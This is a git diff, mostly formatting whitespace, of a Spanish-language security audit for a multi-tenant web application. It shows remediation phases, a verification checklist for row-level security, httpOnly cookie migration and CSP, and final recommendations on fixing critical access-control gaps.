 Semana 4-5: Mejoras de Backend
 - Restringir CORS
@@ -1844,6 +1958,7 @@ Semana 6: Testing y Monitoreo
 ```
 
 ### Fase 4: Mejora Continua (Mes 2-3)
+
 ```
 - Rate limiting más restrictivo
 - Auditoría de logs
@@ -1857,6 +1972,7 @@ Semana 6: Testing y Monitoreo
 ## CHECKLIST DE VERIFICACIÓN
 
 ### Después de Implementar RLS
+
 - [ ] Intentar `SELECT * FROM companies` como usuario normal → Debe fallar o filtrar
 - [ ] Intentar `SELECT * FROM chromatographic_analyses` como COMPANY_ADMIN → Solo ver propios
 - [ ] Verificar que OWNER puede ver todo
@@ -1864,6 +1980,7 @@ Semana 6: Testing y Monitoreo
 - [ ] Verificar que operaciones legítimas funcionan
 
 ### Después de Migrar a Cookies
+
 - [ ] Login exitoso → No hay tokens en localStorage
 - [ ] DevTools > Application > Cookies → Ver accessToken y refreshToken con httpOnly=true
 - [ ] Navegación normal funciona → Cookies se envían automáticamente
@@ -1871,6 +1988,7 @@ Semana 6: Testing y Monitoreo
 - [ ] Intento de acceso a localStorage.getItem('accessToken') → null
 
 ### Después de Implementar CSP
+
 - [ ] DevTools > Console → Sin errores de CSP
 - [ ] Funcionalidad normal no está rota
 - [ ] DevTools > Network → Ver headers CSP en responses
@@ -1881,6 +1999,7 @@ Semana 6: Testing y Monitoreo
 ## CONCLUSIONES Y RECOMENDACIONES FINALES
 
 ### Estado Actual
+
 El sistema presenta una **arquitectura de seguridad parcialmente implementada** con buenas prácticas en autenticación y RBAC, pero con **vulnerabilidades críticas** que exponen datos sensibles:
 
 1. **Base de datos completamente abierta** (sin RLS)
@@ -1888,12 +2007,15 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 3. **Permisos insuficientes en módulo crítico** (cromatografía)
 
 ### Prioridades Absolutas
+
 1. ✅ **Implementar RLS** - Sin esto, cualquier usuario autenticado puede acceder a todo
 2. ✅ **Agregar validación en Cromatografía** - Módulo más crítico sin protección adecuada
 3. ✅ **Migrar a httpOnly cookies** - Proteger tokens contra XSS
 
 ### Cultura de Seguridad
+
 Recomendaciones para el equipo:
+
 - 🔐 **Security by default:** Denegar acceso por defecto, permitir explícitamente
 - 🧪 **Testing de seguridad:** Incluir casos de "acceso no autorizado" en tests
 - 📝 **Code review con foco en seguridad:** Revisar permisos en cada PR
@@ -1901,6 +2023,7 @@ Recomendaciones para el equipo:
 - 📊 **Monitoreo:** Implementar alertas de accesos sospechosos
 
 ### Próximos Pasos
+
 1. Priorizar remediación según matriz de riesgo
 2. Asignar recursos para Fase 1 (crítico)
 3. Considerar pentesting externo después de Fase 3
